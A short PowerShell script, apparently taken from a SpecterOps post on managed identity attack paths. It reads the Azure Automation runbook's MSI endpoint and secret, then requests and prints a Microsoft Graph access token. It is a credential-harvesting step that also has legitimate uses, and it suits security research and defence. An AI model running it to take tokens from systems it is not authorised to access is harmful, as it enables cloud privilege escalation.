# Script by Andy Robbins (@_wald0)
# Source: https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a
# Script to get JWT for the Managed Identity Service Principal running an Automation Runbook

$tokenAuthURI = $env:MSI_ENDPOINT + "?resource=https://graph.microsoft.com/&api-version=2017-09-01"
$tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Secret"="$env:MSI_SECRET"} -Uri $tokenAuthURI
$tokenResponse.access_token
